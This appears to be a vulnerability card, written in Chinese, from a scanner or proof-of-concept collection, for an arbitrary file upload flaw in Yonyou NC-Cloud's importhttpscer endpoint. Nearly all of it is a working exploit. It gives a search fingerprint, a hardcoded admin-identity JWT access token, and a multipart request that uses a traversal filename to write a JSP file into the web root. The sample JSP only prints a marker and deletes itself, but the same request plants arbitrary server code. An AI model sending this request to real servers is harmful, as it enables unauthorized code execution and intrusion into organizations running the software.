# 用友NC-Cloudimporthttpscer任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Client/Uclient/UClient.exe"`
- **请求**：`POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1`
- **关键头**：`accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA`　`Content-Type: multipart/form-data; boundary=fdgbufgiugfbifureh7rgigvgbg998`

**请求体 / payload**
```
--fdgbufgiugfbifureh7rgigvgbg998
Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/dudesuite.jsp"
<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--fdgbufgiugfbifureh7rgigvgbg998--
```
- **预期**：200　|　—